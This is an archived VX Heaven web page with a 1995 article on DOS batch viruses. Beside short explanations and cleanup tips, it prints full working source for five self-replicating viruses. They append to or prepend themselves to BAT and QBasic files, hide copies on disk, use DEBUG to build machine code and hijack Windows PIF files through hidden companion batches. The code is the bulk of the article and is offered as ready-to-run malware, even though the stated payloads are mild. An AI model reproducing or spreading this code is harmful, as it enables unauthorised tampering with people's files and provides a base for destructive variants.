<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Wavefunc 'Batch Viruses (second issue)' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Wavefunc"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Wavefunc,Batch Viruses (second issue), pifv, melt, basvir, echo, batch, comspec, exist, companion, program, code, files, programs, filename, qbasic, basic"/>
<meta name="Description" content="As written these programs are not damaging to data and will only affect BAT, BAS and PIF files. One could say this is still data but no malice is intended. Art maybe. Others might not be so nice - batch viruses are perfectly capable of carrying deadly payloads."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"3bb056404f053477c7439ae0784294e1251bcaef-1498755639-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vwf01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Batch Viruses (second issue)</h1><p><a href="/lib/?lang=en&amp;author=Wavefunc"> Wavefunc</a><br/> <em>September 1995</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vwf01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vwf01">Back to index</a>] [<a href="/lib/vwf01.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#p1">About batch viruses</a></li>
<li><a href="#p2">Batch virus "_!"</a></li>
<li><a href="#p3">Batch virus "BfV"</a></li>
<li><a href="#p4">Batch virus "MeLT"</a></li>
<li><a href="#p5">QBasic virus "BasVir"</a></li>
<li><a href="#p6">PIF virus "PiFV"</a></li>
</ul>
<p>All of these replicating programs require standard MSDOS 6 to function properly. The FIND command must return an errorlevel or they won't work.</p>
<p>I'll despense with the boring warnings, suffice it to say if you utilize any of this in a irresponsible or damaging way then you are responsible for whatever your actions cause.</p>
<p>As written these programs are not damaging to data and will only affect BAT, BAS and PIF files. One could say this is still data but no malice is intended. Art maybe. Others might not be so nice - batch viruses are perfectly capable of carrying deadly payloads.</p>
<p>Recovery from these creatures is easy - load the batch or basic file into EDIT and remove the added virus code. In the case of the PIF virus use the Windows PifEdit program to change the ...bat in the filename field back to ...com or ...exe and remove the hidden companion batch. Some of these viruses make hidden files, use 'DIR \ /AH /S' to find them then for each file that is actually a virus issue 'ATTRIB file -H' then 'DEL file'. Make sure you remove only virus files, leave hidden system files like MSDOS.SYS and IO.SYS (and others) alone!</p>
<h2><a name="p1">About batch viruses</a></h2>
<p>Reproducing batch programs use the FIND command to separate its code from the program that code is attached to. For this to work, every replicating line in the virus must contain a specific string, the key string of the virus. Another vital component of a replicating batch is the FOR command, used to scan for other batch files, usually with the mask "*.BAT". A variety of commands can be used for the actual infection, including FIND, TYPE, ECHO, COPY and MOVE. Simple batch replicators just append their code at the end of batches in the hopes it will run (usually it does). Advanced infectors modify the start of the batch to force the issue. In such cases the added first line does not contain the key string but is added by an ECHO within the virus.</p>
<p>This is not the only type of batch virus! Batch viruses can be written in assembly and use either DEBUG or ECHO to hide the virus code in hex or text which is attached to infected batches. These tend to be very advanced. A batch file can also rename a binary then copy itself to a batch with the same base name. This one's been around for a while.</p>
<p>Most of the viruses presented here become a self contained part of the host, giving them that coveted ability of travel. Machine code is used only for specific functions, not for reproduction. That is done with plain old DOS. Only DOS 6 seems vulnerable to these types of viruses, I have no information on PCDOS, 4DOS or other operating environments. They run on my system and probably on many others.</p>
<p>At the end of this document is an encoded batch that will detect most (practically all) batch viruses of this type and also suspicious code that might indicate a trojan or advanced batch virus of the assembly type. Use a UU decoder to extract the file "BATALERT.BAT".</p>
<h2><a name="p2">Batch virus "_!"</a></h2>
<ul>
<li>Infects parent and current directories</li>
<li>Virus code is appended to the host batch</li>
<li>Only works if host is in current directory</li>
<li>Infects just one batch unless new clean batches are added</li>
</ul>
<p>This is a very simple batch virus. When it runs it appends its code to another batch file in the parent or current directory. It is not very effective but illustrates the basics.</p>
<pre class="source">@ctty nul._!
for %%a in (*.bat ..\*.bat) do set _!=%%a
find "_!"&lt;%_!%
if errorlevel 1 find "_!"&lt;%0.BAT>>%_!%
ctty con._!
</pre>
<h2><a name="p3">Batch virus "BfV"</a></h2>
<ul>
<li>Creates the hidden file "_BFV" in the root directory of drive C</li>
<li>Infects one batch per run in current and parent directories</li>
<li>Gives up after encountering seven infected batches</li>
<li>Virus code is appended to the host batch</li>
</ul>
<p>This is an improved appender. It only has to be run from its own directory once to enable it to reproduce even when the host is in a path directory. To avoid slowing batch files down too much it exits if it can't infect after checking seven batch files. If the host batch ends with nul characters it removes them so the virus code will run.</p>
<pre class="source">@echo off%[BfV_B]%
if '%1=='## goto BfV_%2
if exist C:\_BfV.bat goto BfV_
if not exist %0.bat goto BfV_end
find "BfV"&lt;%0.bat>C:\_BfV.bat
attrib C:\_BfV.bat +h
:BfV_
command /e:5000 /c C:\_BfV ## run
goto BfV_end
:BfV_run
for %%i in (*.bat ..\*.bat) do call C:\_BfV ## inf %%i
exit BfV
:BfV_inf
if '%BfV%=='1111111 exit
set BfV=%BfV%1
find "BfV"&lt;%3>nul
if not errorlevel 1 goto BfV_end
type %3>BfV
type C:\_BfV.bat>>BfV
move BfV %3>nul
exit BfV
:BfV_end
</pre>
<h2><a name="p4">Batch virus "MeLT"</a></h2>
<ul>
<li>Creates the hidden file "MELT_2A" in the temp directory</li>
<li>Infects files in the current, parent and all path directories</li>
<li>Infects one batch per run if less than ten infected files encountered</li>
<li>After detecting ten infected files it displays a graphics screen effect</li>
<li>Adds one line before the host batch and appends the rest</li>
<li>Will not run if attached to AUTOEXEC.BAT (but infects it)</li>
</ul>
<p>This batch virus is much more advanced. It takes control from the host immediately, runs the virus then runs the host batch. The host is run in such a way as to disable the virus until the host is completely finished to avoid slowing down batch files that call themselves in a loop. Simple appenders are very obvious when on such files, but this one causes no significant speed loss except at startup. This virus carries a harmless payload which is assembled with the debug command - it 'melts' the screen in a flash of color then returns it to normal before running the host.</p>
<pre class="source">
@if not '%0==' if '%_melt%==' goto meltbeg
::---- dummy host --------
@echo off
echo Hello World!
::---- end dummy host ----

@goto MeLTend [MeLT_2a]
:MeLTbeg
@echo off%_MeLT%
if '%1=='MeLT goto MeLT%2
if not exist %comspec% set comspec=%_MeLT%command
%comspec% /e:5000 /c %0 MeLT vir
set MeLTcl=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 MeLT rh
set _MeLT=
set MeLTcl=
goto MeLTend
:MeLTrh
set _MeLT=x
%0 %MeLTcl%
:MeLTvir
set MeLTH=%0
if not exist %_MeLT%%temp%\nul set temp=%tmp%
if exist %temp%\MeLT_2a goto MeLTrun
%0 MeLT fnd . %path%
:MeLTfnd
shift%_MeLT%
if '%2==' exit MeLT
set MeLT=%2\%MeLTH%.bat
if not exist %MeLT% set MeLT=%2\%MeLTH%
if not exist %MeLT% set MeLT=%2%MeLTH%.bat
if not exist %MeLT% set MeLT=%2%MeLTH%
if not exist %MeLT% goto MeLTfnd
find "MeLT"&lt;%MeLT%>%temp%\MeLT_2a
attrib %temp%\MeLT_2a +h
:MeLTrun
%MeLTH% MeLT s . .. %path%
:MeLTs
shift%_MeLT%
if '%2==' exit MeLT
for %%a in (%2\*.bat %2*.bat) do call %MeLTH% MeLT inf %%a
goto MeLTs
:MeLTinf
find /i "MeLT"&lt;%3>nul
if not errorlevel 1 goto MeLTno
echo @if not '%%0==' if '%%_melt%%==' goto meltbeg>MeLT.t
type %3>>MeLT.t
echo.>>MeLT.t
type %temp%\MeLT_2a>>MeLT.t
move MeLT.t %3>nul
exit MeLT
:MeLTact - flash-melt screen text then put back to normal
echo e 100 BA D0 07 BB 00 B8 8E C3 8B CA 33 FF 26 8B 05 FE>MeLT.t
echo e 110 C0 FE C4 26 89 05 47 47 E2 F2 FE 06 24 01 75 E8>>MeLT.t
echo e 120 B4 4C CD 21 00>>MeLT.t
echo g>>MeLT.t
debug&lt;MeLT.t>nul
del MeLT.t
exit MeLT
:MeLTno
set MeLTC=%MeLTC%1
if %MeLTC%==1111111111 goto MeLTact
:MeLTend
</pre>
<h2><a name="p5">QBasic virus "BasVir"</a></h2>
<ul>
<li>Infects one BAS file in the current directory per run</li>
<li>Inserts its code in front of the host so it will run first</li>
<li>Does not infect QBasic programs that contain "DECLARE"</li>
<li>Really a batch virus that hides in BASIC code</li>
<li>If the host is renamed the virus won't work</li>
</ul>
<p>I wrote this in response to someone's request on the net for a virus written in BASIC. I hope they don't mind if the BASIC program makes a batch and runs it. It stays out of programs that use procedures to avoid causing errors, such programs cannot tolerate prepended code. This is really a joke, but it's a QBasic virus (no? you write one.)</p>
<p>The following must be named BASVIR.BAS to function.</p>
<pre class="source">
basvirH$ = "BASVIR.BAS"
OPEN "~$.bat" FOR OUTPUT AS #2: REM BasVir
PRINT #2, "@echo off %BasVir1%"
PRINT #2, "if '%1=='BasVir goto BasVir%2"
PRINT #2, "for %%a in (*.bas) do call ~$ BasVir 2 %%a"
PRINT #2, "exit": REM BasVir
PRINT #2, ":BasVir2"
PRINT #2, "find "; CHR$(34); "DECLARE "; CHR$(34); "&lt;%3>nul": REM BasVir
PRINT #2, "if not errorlevel 1 goto BasVirE"
PRINT #2, "echo basvirH$ = "; CHR$(34); "%3"; CHR$(34); ">~1": REM BasVir
PRINT #2, "find "; CHR$(34); "BasVir"; CHR$(34); "&lt;"; basvirH$; ">>~1"
PRINT #2, "copy %3 ~2>nul": REM BasVir
PRINT #2, "copy /b ~1+~2 %3>nul": REM BasVir
PRINT #2, "exit": REM BasVir
PRINT #2, ":BasVirE"
CLOSE #2: REM BasVir
SHELL "~$": REM BasVir
SHELL "del ~?.*": REM BasVir
REM ******* [BasVir] the QBasic Virus *******
REM This is a dummy host program
SYSTEM
</pre>
<h2><a name="p6">PIF virus "PiFV"</a></h2>
<ul>
<li>Creates hidden batch files with the same base name as host</li>
<li>Modifies PIF to run the hidden batch instead of host program</li>
<li>After infecting more PIFs the companion batch runs the host</li>
<li>Sometimes displays a stupid message on Saturdays (it was late)</li>
</ul>
<p>This might be the first PIF virus. One problem with PIF infection is the PIF file must be actually run or it won't work. If the user runs the actual program the virus won't work. It has other problems but is functional enough for a demo. I don't feel up to fixing it right now. It's pretty infectious right now...</p>
<pre class="source">
:: Windows PIF Virus (in batch!)
:: Prog by WaveFunc May 13, 1995
:: (these comments will not replicate)
::
:: This is a virus that 'infects' PIF files, used by Windows to
:: run DOS programs. It works by creating hidden companion batches
:: containing copies of this then altering the PIF file so that the
:: companion batch runs first. After the companion runs it runs the
:: original host program, the name of which is encoded into the
:: companion. The pif files are marked so that they will not be
:: re-infected. Only PIFs are affected, no changes are made to
:: the infected programs. To 'cure', use PIFEDIT to restore the
:: original filenames then delete the hidden files.
::
@echo off
:: host filename...
set pifvo=LIST.COM
:: loop dispatcher...
if '%1=='PiFV goto PiFV_%2
:: run the virus!
set _PiFV=
if not exist %comspec% set comspec=C:\COMMAND.COM%_PiFV%
%comspec% /e:5000 /c %0 PiFV go>nul
if exist PiFV! del PiFV!
:: run the host
set PiFVcl=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 PiFV hst
set PiFVo=
set PiFVcl=
:: check for activation...
echo.|date|find /i "sat">nul.PiFV
if errorlevel 1 goto PiFV_end
echo.|time|find "7">nul.PiFV
if errorlevel 1 goto PiFV_msg
set PiFV=echo
cls%_PiFV%
%PiFV%.
%PiFV% There once was an Otter named Oscer
%PiFV% Who claimed to know how to make water.
%PiFV% "No more dams," he said, "use my water instead!"
%PiFV% But the Elder Otter was not impressed.
pause>nul.PiFV
set PiFV=
goto PiFV_end
:PiFV_msg
echo [PiFV] by WaveFunc
goto PiFV_end
:PiFV_hst
%PiFVo% %PiFVcl%
goto PiFV_end
:PiFV_go
set PiFVh=%0
if not exist %PiFVh% set PiFVh=%0.bat
if not exist %PiFVh% exit
for %%a in (*.pif) do call %0 PiFV inf %%a
exit PiFV
:PiFV_inf
set PiFVp=%3
:: get victim filename and infection marker
:: from PIF file using debug...
if exist PiFV! goto PiFV_1
echo m 124,162 524>PiFV!
echo e 100 <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4d6a0d3e2839">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> fn='>>PiFV!
echo m 524,562 108>>PiFV!
echo n pifv$.bat>>PiFV!
echo rcx>>PiFV!
echo 47>>PiFV!
echo w>>PiFV!
echo m 55E,561 108>>PiFV!
echo e 10C 0>>PiFV!
echo n pifv$$.bat>>PiFV!
echo rcx>>PiFV!
echo 10>>PiFV!
echo w>>PiFV!
echo q>>PiFV!
:PiFV_1
debug %PiFVp%&lt;PiFV!>nul
call PiFV$
set PiFVn=%fn%
call PiFV$$
set PiFVi=%fn%
del PiFV$?.bat
:: pifvn=orig filename
:: pifvi=infection marker
:: pifvp=pif filename
:: pifvh=companion bat file
:: skip infected or 'empty' pifs...
if '%PiFVi%=='PiFV goto PiFV_end
if '%PiFVn%==' goto PiFV_end
:: don't shadow command.com (be nice)
echo %PiFVn%|find /i "command">nul
if not errorlevel 1 goto PiFV_end
:: infectable - create a companion batch...
:: (the following code strips off the extension)
echo e 100 e8 16 00 b4 08 cd 21 3c 00 74 0c 3c 2e 74 08 88>PiFV$$
echo e 110 c2 b4 02 cd 21 eb ec cd 20 ba 21 01 b4 09 cd 21>>PiFV$$
echo e 120 c3 73 65 74 20 66 6e 3d 24 00>>PiFV$$
echo n pifv$.com>>PiFV$$
echo rcx>>PiFV$$
echo 2a>>PiFV$$
echo w>>PiFV$$
echo q>>PiFV$$
debug&lt;PiFV$$>nul
echo %PiFVn%|PiFV$>PiFV$$.bat
call PiFV$$
set PiFVb=%fn%.bat
del PiFV$?.*
:: pifvb=new batch name
:: do not shadow if comp has same name as host
if %PiFVo%==%PiFVb% goto PiFV_end
if exist %PiFVb% goto PiFV_end
echo @echo off>%PiFVb%
echo set pifvo=%pifvn%>>%PiFVb%
find "PiFV"&lt;%PiFVh%>>%PiFVb%
attrib %PiFVb% +h
:: ...and point the PIF at the companion
echo e 15E 'PiFV',0>PiFV$$
echo e 124 '%PiFVb%',0>>PiFV$$
echo w>>PiFV$$
echo q>>PiFV$$
debug %PiFVp%&lt;PiFV$$>nul
del PiFV$$
:: I think we're done!
exit PiFV
:PiFV_end
:: wonder how many bugs all this has in it? Only one
:: way to find out...
</pre>
[<a style="" href="/lib/?lang=EN&amp;index=MA#vwf01">Back to index</a>] [<a href="/lib/vwf01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vwf01">de</a><a href="/lib/index.php?lang=en&amp;id=vwf01">en</a><a href="/lib/index.php?lang=es&amp;id=vwf01">es</a><a href="/lib/index.php?lang=it&amp;id=vwf01">it</a><a href="/lib/index.php?lang=fr&amp;id=vwf01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vwf01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vwf01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vwf01">ua</a></div>
</body>
</html>
